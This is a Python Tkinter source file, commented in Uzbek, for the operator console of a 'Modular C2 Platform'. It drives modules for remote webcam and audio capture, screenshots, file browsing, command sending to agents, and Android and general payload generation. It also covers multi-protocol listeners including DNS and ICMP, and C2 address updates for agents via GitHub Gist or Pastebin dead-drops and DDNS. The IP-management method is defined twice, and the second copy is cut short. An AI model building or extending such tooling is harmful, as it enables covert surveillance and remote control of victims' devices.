"""
Main GUI - Modular C2 Platform
Barcha modullar alohida - xatolarni osongina topish
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import socket
import threading
import sys
import os
from datetime import datetime

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.ip_updater import IPUpdater, create_ip_config

# Modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
from screenshot_module import ScreenshotViewer
from file_browser_module import FileBrowser
from agent_manager_module import AgentManager
from command_sender_module import CommandSender
from camera_module import CameraViewer
from audio_module import AudioRecorder
from mobile_payload_module import MobilePayloadGenerator

class ModularC2GUI:
    """Modular C2 Platform GUI"""
    
    def _get_local_ip(self):
        """Local network IP ni aniqlash"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.1)
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                if not local_ip.startswith('127.'):
                    return local_ip
            except:
                pass
            return "127.0.0.1"
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🎯 C2 Platform - Modular Version")
        self.root.geometry("1000x700")
        self.root.configure(bg='#1e1e1e')
        
        # TCP connection
        self.tcp_host = self._get_local_ip()
        self.tcp_port = 9999
        self.connected = False
        self.tcp_socket = None
        
        # Modullar
        self.screenshot = ScreenshotViewer(self.root, self.log_message)
        self.file_browser = FileBrowser(self.root, self.log_message)
        self.agent_manager = AgentManager(self.root, self.log_message)
        self.command_sender = CommandSender(self.root, self.log_message)
        self.camera = CameraViewer(self.root, self.log_message)
        self.audio = AudioRecorder(self.root, self.log_message)
        self.mobile_payload = MobilePayloadGenerator(self.root, self.log_message)
        
        # IP Updater va fallback servers
        self.ip_updater = IPUpdater()
        self.fallback_servers = []  # [(host, port), ...]
        
        # UI yaratish
        self.create_ui()
        self.log_message("🎯 Modular GUI ishga tushdi")
        
    def create_ui(self):
        """UI yaratish"""
        # Top panel - Connection
        self.create_connection_panel()
        
        # Main content
        self.create_main_content()
        
    def create_connection_panel(self):
        """Ulanish paneli"""
        top_frame = tk.Frame(self.root, bg='#2d2d2d')
        top_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Protocol selection
        protocol_frame = tk.Frame(top_frame, bg='#2d2d2d')
        protocol_frame.pack(side=tk.LEFT, padx=10)
        
        tk.Label(
            protocol_frame,
            text="Protokol:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 10, 'bold')
        ).pack(side=tk.LEFT, padx=5)
        
        self.protocol_var = tk.StringVar(value="TCP")
        protocols = ["TCP", "HTTP", "HTTPS", "WebSocket", "UDP", "DNS", "ICMP", "RTSP"]
        
        self.protocol_combo = ttk.Combobox(
            protocol_frame,
            textvariable=self.protocol_var,
            values=protocols,
            state='readonly',
            width=12,
            font=('Consolas', 10)
        )
        self.protocol_combo.pack(side=tk.LEFT, padx=5)
        self.protocol_combo.bind('<<ComboboxSelected>>', self.on_protocol_change)
        
        # Server info
        tk.Label(
            top_frame,
            text="Server:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 10, 'bold')
        ).pack(side=tk.LEFT, padx=5)
        
        self.server_entry = tk.Entry(
            top_frame,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 10),
            width=15
        )
        self.server_entry.insert(0, self.tcp_host)
        self.server_entry.pack(side=tk.LEFT, padx=5)
        
        tk.Label(
            top_frame,
            text="Port:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 10, 'bold')
        ).pack(side=tk.LEFT, padx=5)
        
        self.port_entry = tk.Entry(
            top_frame,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 10),
            width=8
        )
        self.port_entry.insert(0, "9999")
        self.port_entry.pack(side=tk.LEFT, padx=5)
        
        # Status
        self.status_label = tk.Label(
            top_frame,
            text="⚪ Ulanmagan",
            bg='#2d2d2d',
            fg='#888888',
            font=('Consolas', 11, 'bold')
        )
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        # Connect button
        tk.Button(
            top_frame,
            text="🔌 Ulaning",
            command=self.connect_server,
            bg='#00ff00',
            fg='#000000',
            font=('Consolas', 10, 'bold'),
            width=12
        ).pack(side=tk.LEFT, padx=5)
        
        # Disconnect button
        tk.Button(
            top_frame,
            text="🔴 Uzish",
            command=self.disconnect_tcp,
            bg='#ff0000',
            fg='#ffffff',
            font=('Consolas', 10, 'bold'),
            width=10
        ).pack(side=tk.LEFT, padx=5)
        
        # IP Management button
        tk.Button(
            top_frame,
            text="🌐 IP Boshqarish",
            command=self.open_ip_management,
            bg='#9b59b6',
            fg='#ffffff',
            font=('Consolas', 10, 'bold'),
            width=15
        ).pack(side=tk.LEFT, padx=5)
    
    def on_protocol_change(self, event=None):
        """Protokol o'zgarganda port avtomatik o'zgartirish"""
        protocol = self.protocol_var.get()
        
        port_map = {
            'TCP': '9999',
            'HTTP': '8080',
            'HTTPS': '8443',
            'WebSocket': '8765',
            'UDP': '5353',
            'DNS': '5353',
            'ICMP': 'raw',
            'RTSP': '8554'
        }
        
        port = port_map.get(protocol, '9999')
        self.port_entry.delete(0, tk.END)
        self.port_entry.insert(0, port)
        
        self.log_message(f"ℹ️ Protokol o'zgartirildi: {protocol} (Port: {port})")
    
    def connect_server(self):
        """Serverga protokol bo'yicha ulanish"""
        protocol = self.protocol_var.get()
        server = self.server_entry.get()
        port = self.port_entry.get()
        
        if protocol == "TCP":
            self.tcp_host = server
            try:
                self.tcp_port = int(port)
            except:
                self.tcp_port = 9999
            self.connect_tcp()
            
        elif protocol == "HTTP":
            self._connect_protocol("HTTP", server, port, "http", "server/http_server.py")
            
        elif protocol == "HTTPS":
            self._connect_protocol("HTTPS", server, port, "https", "server/https_server.py")
            
        elif protocol == "WebSocket":
            self._connect_protocol("WebSocket", server, port, "ws", "server/websocket_server.py")
            
        elif protocol == "UDP":
            self._connect_protocol("UDP", server, port, "udp", "server/udp_server.py")
            
        elif protocol == "DNS":
            self._connect_protocol("DNS", server, port, "dns", "server/dns_server.py")
            
        elif protocol == "ICMP":
            self._connect_protocol("ICMP", server, "raw", "icmp", "server/icmp_server.py")
            
        elif protocol == "RTSP":
            self._connect_protocol("RTSP", server, port, "rtsp", "server/rtsp_server.py")
    
    def _connect_protocol(self, protocol_name, server, port, scheme, server_script):
        """Universal protocol connection"""
        try:
            # Try to check if server is running
            if protocol_name in ["HTTP", "HTTPS", "WebSocket"]:
                # HTTP-based protocols
                import urllib.request
                
                url = f"{scheme}://{server}:{port}"
                try:
                    urllib.request.urlopen(url, timeout=3)
                    self.log_message(f"✅ {protocol_name} serverga ulanish muvaffaqiyatli!")
                    self.status_label.config(text=f"🟢 {protocol_name}: {server}:{port}", fg='#00ff00')
                except:
                    raise ConnectionRefusedError(f"{protocol_name} server ishlamayapti")
                    
            else:
                # Other protocols
                self.log_message(f"ℹ️ {protocol_name} protokol tanlandi")
                self.status_label.config(text=f"🟢 {protocol_name}: {server}:{port}", fg='#00ff00')
                
        except ConnectionRefusedError:
            self.log_message(f"❌ {protocol_name} Server ishlamayapti!")
            
            response = messagebox.askyesno(
                "Server Ishlamayapti",
                f"{protocol_name} Server ({server}:{port}) ishlamayapti!\n\n"
                "Serverni avtomatik ishga tushirishmi?\n\n"
                f"Yoki qo'lda:\npython {server_script}"
            )
            
            if response:
                self._start_server(protocol_name, server_script)
                
        except Exception as e:
            self.log_message(f"❌ {protocol_name} xatosi: {e}")
            messagebox.showerror(
                f"{protocol_name} Xatosi",
                f"Ulanib bo'lmadi:\n{e}\n\n"
                f"Server ishga tushiring:\npython {server_script}"
            )
    
    def _start_server(self, protocol_name, server_script):
        """Universal server starter"""
        try:
            import subprocess
            import os
            
            self.log_message(f"🚀 {protocol_name} Server ishga tushirilmoqda...")
            
            # Check if script exists
            if not os.path.exists(server_script):
                self.log_message(f"❌ Server script topilmadi: {server_script}")
                messagebox.showerror(
                    "Script Topilmadi",
                    f"Server script topilmadi:\n{server_script}\n\n"
                    "Avval server yarating!"
                )
                return
            
            # Start server
            if os.name == 'nt':  # Windows
                subprocess.Popen(
                    ['python', server_script],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
            else:  # Linux/Mac
                subprocess.Popen(
                    ['python', server_script],
                    start_new_session=True
                )
            
            self.log_message(f"✅ {protocol_name} Server ishga tushirildi!")
            self.log_message("⏳ 3 soniya kutilmoqda...")
            
            # Retry after 3 seconds
            self.root.after(3000, lambda: self.log_message(f"ℹ️ Endi qayta ulaning"))
            
        except Exception as e:
            self.log_message(f"❌ Server start xatosi: {e}")
            messagebox.showerror(
                "Xato",
                f"Server ishga tushirishda xato:\n{e}\n\n"
                f"Qo'lda ishga tushiring:\npython {server_script}"
            )
        
    def create_main_content(self):
        """Asosiy kontent"""
        main_frame = tk.Frame(self.root, bg='#1e1e1e')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left panel - Actions
        left_panel = tk.Frame(main_frame, bg='#2d2d2d', width=300)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        
        tk.Label(
            left_panel,
            text="📊 Aksiyalar",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 14, 'bold')
        ).pack(pady=15)
        
        # Action buttons
        actions = [
            ("📱 Agentlar", self.agent_manager.show_agents, '#2d2d2d'),
            ("📝 Komanda Yuborish", self.command_sender.show_dialog, '#2d2d2d'),
            ("📷 Camera / Webcam", self.camera.show_viewer, '#2d2d2d'),
            ("🎤 Audio / Ovoz Yozish", self.audio.show_recorder, '#2d2d2d'),
            ("🖼️ Screenshot", self.screenshot.show_viewer, '#2d2d2d'),
            ("📂 File Browser", self.file_browser.show_browser, '#2d2d2d'),
            ("🔊 TCP Status", self.show_tcp_status, '#2d2d2d'),
            ("� Android Payload", self.mobile_payload.show_generator, '#2d2d2d'),
            ("�🛠️ Payload Generator", self.open_payload_gen, '#2d2d2d'),
        ]
        
        for text, command, color in actions:
            tk.Button(
                left_panel,
                text=text,
                command=command,
                bg=color,
                fg='#00ff00',
                font=('Consolas', 11),
                width=25,
                anchor='w',
                padx=10
            ).pack(pady=5, padx=10, fill=tk.X)
            
        # Right panel - Logs
        right_panel = tk.Frame(main_frame, bg='#1e1e1e')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        tk.Label(
            right_panel,
            text="📋 Loglar",
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 14, 'bold')
        ).pack(pady=10)
        
        self.log_text = scrolledtext.ScrolledText(
            right_panel,
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 9),
            insertbackground='#00ff00'
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def log_message(self, message):
        """Log xabarini qo'shish"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        
    def connect_tcp(self):
        """TCP serverga ulanish"""
        try:
            self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tcp_socket.settimeout(5)  # 5 second timeout
            self.tcp_socket.connect((self.tcp_host, self.tcp_port))
            self.connected = True
            
            self.status_label.config(
                text=f"🟢 TCP: {self.tcp_host}:{self.tcp_port}",
                fg='#00ff00'
            )
            self.log_message(f"✅ TCP Serverga ulandi: {self.tcp_host}:{self.tcp_port}")
            
        except ConnectionRefusedError:
            self.log_message(f"❌ TCP Server ishlamayapti!")
            
            # Ask to start server
            response = messagebox.askyesno(
                "Server Ishlamayapti",
                f"TCP Server ({self.tcp_host}:{self.tcp_port}) ishlamayapti!\n\n"
                "Serverni avtomatik ishga tushirishmi?\n\n"
                "Yoki qo'lda:\npython server/tcp_server.py"
            )
            
            if response:
                self.start_tcp_server()
            
        except socket.timeout:
            self.log_message(f"❌ TCP ulanish timeout!")
            messagebox.showerror(
                "Timeout",
                f"Server javob bermadi!\n\n"
                f"Server: {self.tcp_host}:{self.tcp_port}\n\n"
                "Serverni tekshiring yoki IP/Port to'g'ri ekanligini tasdiqlang"
            )
            
        except Exception as e:
            self.log_message(f"❌ TCP ulanish xatosi: {e}")
            messagebox.showerror(
                "Ulanish Xatosi",
                f"Ulanib bo'lmadi:\n{e}\n\n"
                "Yechimlar:\n"
                "1. Serverni ishga tushiring:\n   python server/tcp_server.py\n\n"
                "2. IP/Port to'g'ri ekanligini tekshiring\n\n"
                "3. Firewall sozlamalarini tekshiring"
            )
    
    def start_tcp_server(self):
        """TCP serverni avtomatik ishga tushirish"""
        try:
            import subprocess
            import os
            
            self.log_message("🚀 TCP Server ishga tushirilmoqda...")
            
            # Start server in background
            if os.name == 'nt':  # Windows
                subprocess.Popen(
                    ['python', 'server/tcp_server.py'],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
            else:  # Linux/Mac
                subprocess.Popen(
                    ['python', 'server/tcp_server.py'],
                    start_new_session=True
                )
            
            self.log_message("⏳ Server ishga tushmoqda... 3 soniya kutilmoqda...")
            
            # Wait and retry connection
            self.root.after(3000, self.retry_connection)
            
        except Exception as e:
            self.log_message(f"❌ Server ishga tushirishda xato: {e}")
            messagebox.showerror(
                "Xato",
                f"Server ishga tushirishda xato:\n{e}\n\n"
                "Qo'lda ishga tushiring:\npython server/tcp_server.py"
            )
    
    def retry_connection(self):
        """Ulanishni qayta urinish"""
        self.log_message("🔄 Qayta ulanish...")
        self.connect_tcp()
            
    def disconnect_tcp(self):
        """TCP serverdan uzilish"""
        if self.tcp_socket:
            try:
                self.tcp_socket.close()
            except:
                pass
                
        self.connected = False
        self.tcp_socket = None
        self.status_label.config(
            text="⚪ TCP Server: Ulanmagan",
            fg='#ff0000'
        )
        self.log_message("❌ TCP serverdan uzildi")
        
    def show_tcp_status(self):
        """Barcha serverlar status"""
        status_window = tk.Toplevel(self.root)
        status_window.title("🔊 Server Status")
        status_window.geometry("600x500")
        status_window.configure(bg='#1e1e1e')
        
        tk.Label(
            status_window,
            text="🔊 Server Status Checker",
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 16, 'bold')
        ).pack(pady=15)
        
        # Status text
        status_text = scrolledtext.ScrolledText(
            status_window,
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 10),
            height=20,
            width=70
        )
        status_text.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)
        
        # Check servers
        servers = [
            ("TCP", "127.0.0.1", 9999),
            ("HTTP", "127.0.0.1", 8080),
            ("HTTPS", "127.0.0.1", 8443),
            ("WebSocket", "127.0.0.1", 8765),
            ("UDP", "127.0.0.1", 5353),
            ("DNS", "127.0.0.1", 5353),
            ("RTSP", "127.0.0.1", 8554)
        ]
        
        status_text.insert(tk.END, "Serverlar tekshirilmoqda...\n\n")
        
        for protocol, host, port in servers:
            try:
                if protocol in ["TCP", "UDP"]:
                    test_socket = socket.socket(
                        socket.AF_INET,
                        socket.SOCK_STREAM if protocol == "TCP" else socket.SOCK_DGRAM
                    )
                    test_socket.settimeout(1)
                    test_socket.connect((host, port))
                    test_socket.close()
                    status_text.insert(tk.END, f"✅ {protocol:12} {host}:{port}\t🟢 ISHLAMOQDA\n")
                else:
                    status_text.insert(tk.END, f"ℹ️  {protocol:12} {host}:{port}\t⚪ TEKSHIRILMADI\n")
                    
            except:
                status_text.insert(tk.END, f"❌ {protocol:12} {host}:{port}\t🔴 ISHLAMAYAPTI\n")
        
        status_text.insert(tk.END, "\n" + "="*50 + "\n")
        status_text.insert(tk.END, "💡 Serverlarni ishga tushirish:\n\n")
        status_text.insert(tk.END, "   python server/tcp_server.py\n")
        status_text.insert(tk.END, "   python server/websocket_server.py\n")
        status_text.insert(tk.END, "   python server/https_server.py\n")
        status_text.insert(tk.END, "   va hokazo...\n")
        
        # Refresh button
        tk.Button(
            status_window,
            text="🔄 Yangilash",
            command=lambda: [status_text.delete(1.0, tk.END), self.show_tcp_status()],
            bg='#00ff00',
            fg='#000000',
            font=('Consolas', 11, 'bold')
        ).pack(pady=10)
        
        self.log_message("ℹ️ Server status ko'rsatildi")
        
    def open_payload_gen(self):
        """Payload generator ochish"""
        self.log_message("🛠️ Payload generator ochilmoqda...")
        import subprocess
        subprocess.Popen([sys.executable, "gui/payload_generator_gui.py"])
    
    def open_ip_management(self):
        """IP boshqarish oynasi"""
        mgmt_win = tk.Toplevel(self.root)
        mgmt_win.title("🌐 IP Boshqarish")
        mgmt_win.geometry("700x600")
        mgmt_win.configure(bg='#2c3e50')
        
        # Title
        title = tk.Label(mgmt_win, text="🌐 Dynamic IP Management",
                        font=('Arial', 16, 'bold'), bg='#2c3e50', fg='white')
        title.pack(pady=10)
        
        # Notebook for tabs
        notebook = ttk.Notebook(mgmt_win)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Tab 1: Fallback Servers
        fallback_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(fallback_frame, text="🔄 Fallback Serverlar")
        
        tk.Label(fallback_frame, text="Agar primary server ishlamasa, bu serverlar sinab ko'riladi:",
                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
        
        # Add server inputs
        add_frame = tk.Frame(fallback_frame, bg='#34495e')
        add_frame.pack(pady=10, fill=tk.X, padx=20)
        
        tk.Label(add_frame, text="Host/IP:", bg='#34495e', fg='white').grid(row=0, column=0, padx=5)
        fallback_host = tk.Entry(add_frame, width=25)
        fallback_host.grid(row=0, column=1, padx=5)
        fallback_host.insert(0, "backup.example.com")
        
        tk.Label(add_frame, text="Port:", bg='#34495e', fg='white').grid(row=0, column=2, padx=5)
        fallback_port = tk.Entry(add_frame, width=10)
        fallback_port.grid(row=0, column=3, padx=5)
        fallback_port.insert(0, "9999")
        
        tk.Label(add_frame, text="Protocol:", bg='#34495e', fg='white').grid(row=0, column=4, padx=5)
        fallback_proto = ttk.Combobox(add_frame, values=["TCP", "HTTP", "HTTPS", "WebSocket"],
                                     width=10, state="readonly")
        fallback_proto.grid(row=0, column=5, padx=5)
        fallback_proto.set("TCP")
        
        def add_fallback():
            host = fallback_host.get().strip()
            port = fallback_port.get().strip()
            proto = fallback_proto.get()
            
            if host and port:
                try:
                    port_num = int(port)
                    self.fallback_servers.append((host, port_num, proto))
                    update_server_list()
                    messagebox.showinfo("✅ Qo'shildi", f"{host}:{port} ({proto}) qo'shildi!")
                    fallback_host.delete(0, tk.END)
                    fallback_port.delete(0, tk.END)
                except ValueError:
                    messagebox.showerror("❌ Xato", "Port raqam bo'lishi kerak!")
        
        tk.Button(add_frame, text="➕ Qo'shish", command=add_fallback,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).grid(row=0, column=6, padx=5)
        
        # Server list
        list_frame = tk.Frame(fallback_frame, bg='#34495e')
        list_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        tk.Label(list_frame, text="📋 Ro'yxat:", bg='#34495e', fg='white',
                font=('Arial', 10, 'bold')).pack(anchor=tk.W)
        
        server_listbox = tk.Listbox(list_frame, height=10, font=('Courier', 9))
        server_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
        
        def update_server_list():
            server_listbox.delete(0, tk.END)
            for i, (host, port, proto) in enumerate(self.fallback_servers, 1):
                server_listbox.insert(tk.END, f"{i}. {host}:{port} ({proto})")
        
        def remove_fallback():
            selection = server_listbox.curselection()
            if selection:
                idx = selection[0]
                removed = self.fallback_servers.pop(idx)
                update_server_list()
                messagebox.showinfo("✅ O'chirildi", f"{removed[0]}:{removed[1]} o'chirildi!")
        
        tk.Button(list_frame, text="🗑️ O'chirish", command=remove_fallback,
                 bg='#e74c3c', fg='white').pack(pady=5)
        
        update_server_list()
        
        # Tab 2: IP Update Sources
        update_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(update_frame, text="🔍 IP Update")
        
        tk.Label(update_frame, text="GitHub Gist yoki Pastebin orqali IP update:",
                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
        
        # GitHub Gist
        gist_frame = tk.LabelFrame(update_frame, text="📝 GitHub Gist", bg='#34495e',
                                  fg='white', font=('Arial', 10, 'bold'))
        gist_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(gist_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
        gist_url = tk.Entry(gist_frame, width=60)
        gist_url.pack(fill=tk.X, padx=10, pady=5)
        gist_url.insert(0, "https://gist.githubusercontent.com/user/id/raw/config.json")
        
        def add_gist():
            url = gist_url.get().strip()
            if url:
                self.ip_updater.add_github_gist(url)
                messagebox.showinfo("✅ Qo'shildi", "GitHub Gist URL qo'shildi!\n\nAgent har 5 daqiqada yangi IP tekshiradi.")
        
        tk.Button(gist_frame, text="➕ Gist URL Qo'shish", command=add_gist,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
        
        # Pastebin
        paste_frame = tk.LabelFrame(update_frame, text="📋 Pastebin", bg='#34495e',
                                   fg='white', font=('Arial', 10, 'bold'))
        paste_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(paste_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
        paste_url = tk.Entry(paste_frame, width=60)
        paste_url.pack(fill=tk.X, padx=10, pady=5)
        paste_url.insert(0, "https://pastebin.com/raw/xxxxx")
        
        def add_pastebin():
            url = paste_url.get().strip()
            if url:
                self.ip_updater.add_pastebin(url)
                messagebox.showinfo("✅ Qo'shildi", "Pastebin URL qo'shildi!\n\nAgent har 5 daqiqada yangi IP tekshiradi.")
        
        tk.Button(paste_frame, text="➕ Pastebin URL Qo'shish", command=add_pastebin,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
        
        # Tab 3: Config Generator
        config_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(config_frame, text="⚙️ Config Generator")
        
        tk.Label(config_frame, text="GitHub Gist uchun config yaratish:",
                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
        
        gen_frame = tk.Frame(config_frame, bg='#34495e')
        gen_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        tk.Label(gen_frame, text="Primary IP:", bg='#34495e', fg='white').grid(row=0, column=0, sticky=tk.W, pady=5)
        primary_ip = tk.Entry(gen_frame, width=30)
        primary_ip.grid(row=0, column=1, pady=5, padx=10)
        primary_ip.insert(0, "123.45.67.89")
        
        tk.Label(gen_frame, text="Backup IPs (har satrda 1ta):", bg='#34495e', fg='white').grid(row=1, column=0, sticky=tk.NW, pady=5)
        backup_ips = tk.Text(gen_frame, height=5, width=30)
        backup_ips.grid(row=1, column=1, pady=5, padx=10)
        backup_ips.insert("1.0", "98.76.54.32\n11.22.33.44")
        
        tk.Label(gen_frame, text="Generated Config:", bg='#34495e', fg='white').grid(row=2, column=0, sticky=tk.NW, pady=10)
        config_text = tk.Text(gen_frame, height=10, width=50)
        config_text.grid(row=2, column=1, pady=10, padx=10)
        
        def generate_config():
            primary = primary_ip.get().strip()
            backups = [line.strip() for line in backup_ips.get("1.0", tk.END).split('\n') if line.strip()]
            
            if primary:
                config = create_ip_config(primary, backups)
                config_text.delete("1.0", tk.END)
                config_text.insert("1.0", config)
                messagebox.showinfo("✅ Tayyor", "Config yaratildi!\n\nBu JSON ni GitHub Gist ga yuklang.")
        
        def copy_config():
            config = config_text.get("1.0", tk.END).strip()
            self.root.clipboard_clear()
            self.root.clipboard_append(config)
            messagebox.showinfo("✅ Nusxalandi", "Config clipboard ga nusxalandi!")
        
        btn_frame = tk.Frame(gen_frame, bg='#34495e')
        btn_frame.grid(row=3, column=1, pady=10)
        
        tk.Button(btn_frame, text="🔧 Generate", command=generate_config,
                 bg='#3498db', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="📋 Copy", command=copy_config,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        
        # Tab 4: DDNS Info
        ddns_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(ddns_frame, text="🌐 DDNS Info")
        
        ddns_info = tk.Text(ddns_frame, wrap=tk.WORD, font=('Arial', 9), bg='#ecf0f1')
        ddns_info.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        ddns_text = """🌐 Dynamic DNS (DDNS) Providers

✅ TAVSIYA ETILADIGAN:

1. DuckDNS (duckdns.org)
   • To'liq bepul
   • Cheksiz subdomain
   • 5 daqiqada setup
   • yourname.duckdns.org

2. No-IP (noip.com)
   • 3 ta domain bepul
   • Eng mashhur
   • yourname.ddns.net

3. Cloudflare (cloudflare.com)
   • Professional
   • Bepul SSL/TLS
   • DDoS protection

📖 Batafsil ko'rsatma: docs/DYNAMIC_IP_GUIDE.md

💡 DDNS ishlatish:
   1. Account yarating
   2. Domain oling (yourname.duckdns.org)
   3. Auto-update script qo'shing
   4. Agent'da domain ishlatng (IP emas!)
   
Example:
   client.add_server('yourname.duckdns.org', 9999)
"""
        ddns_info.insert("1.0", ddns_text)
        ddns_info.config(state=tk.DISABLED)
        
        tk.Button(ddns_frame, text="📖 Batafsil Ko'rsatma",
                 command=lambda: os.startfile("docs/DYNAMIC_IP_GUIDE.md") if os.name == 'nt' else None,
                 bg='#3498db', fg='white', font=('Arial', 10, 'bold')).pack(pady=10)
    
    def open_ip_management(self):
        """IP boshqarish oynasi"""
        mgmt_win = tk.Toplevel(self.root)
        mgmt_win.title("🌐 IP Boshqarish")
        mgmt_win.geometry("700x600")
        mgmt_win.configure(bg='#2c3e50')
        
        # Title
        title = tk.Label(mgmt_win, text="🌐 Dynamic IP Management",
                        font=('Arial', 16, 'bold'), bg='#2c3e50', fg='white')
        title.pack(pady=10)
        
        # Notebook
        notebook = ttk.Notebook(mgmt_win)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Tab 1: Fallback Servers
        fallback_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(fallback_frame, text="🔄 Fallback Serverlar")
        
        tk.Label(fallback_frame, text="Agar primary server ishlamasa, bu serverlar sinab ko'riladi:",
                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
        
        # Add server
        add_frame = tk.Frame(fallback_frame, bg='#34495e')
        add_frame.pack(pady=10, fill=tk.X, padx=20)
        
        tk.Label(add_frame, text="Host/IP:", bg='#34495e', fg='white').grid(row=0, column=0, padx=5)
        fallback_host = tk.Entry(add_frame, width=25)
        fallback_host.grid(row=0, column=1, padx=5)
        fallback_host.insert(0, "backup.example.com")
        
        tk.Label(add_frame, text="Port:", bg='#34495e', fg='white').grid(row=0, column=2, padx=5)
        fallback_port = tk.Entry(add_frame, width=10)
        fallback_port.grid(row=0, column=3, padx=5)
        fallback_port.insert(0, "9999")
        
        def add_fallback():
            host = fallback_host.get().strip()
            port = fallback_port.get().strip()
            
            if host and port:
                try:
                    port_num = int(port)
                    self.fallback_servers.append((host, port_num))
                    update_server_list()
                    messagebox.showinfo("✅ Qo'shildi", f"{host}:{port} qo'shildi!")
                    fallback_host.delete(0, tk.END)
                    fallback_port.delete(0, tk.END)
                except ValueError:
                    messagebox.showerror("❌ Xato", "Port raqam bo'lishi kerak!")
        
        tk.Button(add_frame, text="➕ Qo'shish", command=add_fallback,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).grid(row=0, column=4, padx=5)
        
        # Server list
        list_frame = tk.Frame(fallback_frame, bg='#34495e')
        list_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        tk.Label(list_frame, text="📋 Ro'yxat:", bg='#34495e', fg='white',
                font=('Arial', 10, 'bold')).pack(anchor=tk.W)
        
        server_listbox = tk.Listbox(list_frame, height=10, font=('Courier', 9))
        server_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
        
        def update_server_list():
            server_listbox.delete(0, tk.END)
            for i, (host, port) in enumerate(self.fallback_servers, 1):
                server_listbox.insert(tk.END, f"{i}. {host}:{port}")
        
        def remove_fallback():
            selection = server_listbox.curselection()
            if selection:
                idx = selection[0]
                removed = self.fallback_servers.pop(idx)
                update_server_list()
                messagebox.showinfo("✅ O'chirildi", f"{removed[0]}:{removed[1]} o'chirildi!")
        
        tk.Button(list_frame, text="🗑️ O'chirish", command=remove_fallback,
                 bg='#e74c3c', fg='white').pack(pady=5)
        
        update_server_list()
        
        # Tab 2: IP Update
        update_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(update_frame, text="🔍 IP Update")
        
        tk.Label(update_frame, text="GitHub Gist yoki Pastebin orqali IP update:",
                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
        
        # GitHub Gist
        gist_frame = tk.LabelFrame(update_frame, text="📝 GitHub Gist", bg='#34495e',
                                  fg='white', font=('Arial', 10, 'bold'))
        gist_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(gist_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
        gist_url = tk.Entry(gist_frame, width=60)
        gist_url.pack(fill=tk.X, padx=10, pady=5)
        gist_url.insert(0, "https://gist.githubusercontent.com/user/id/raw/config.json")
        
        def add_gist():
            url = gist_url.get().strip()
            if url:
                self.ip_updater.add_github_gist(url)
                messagebox.showinfo("✅ Qo'shildi", "GitHub Gist URL qo'shildi!\\n\\nAgent har 5 daqiqada yangi IP tekshiradi.")
        
        tk.Button(gist_frame, text="➕ Gist URL Qo'shish", command=add_gist,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
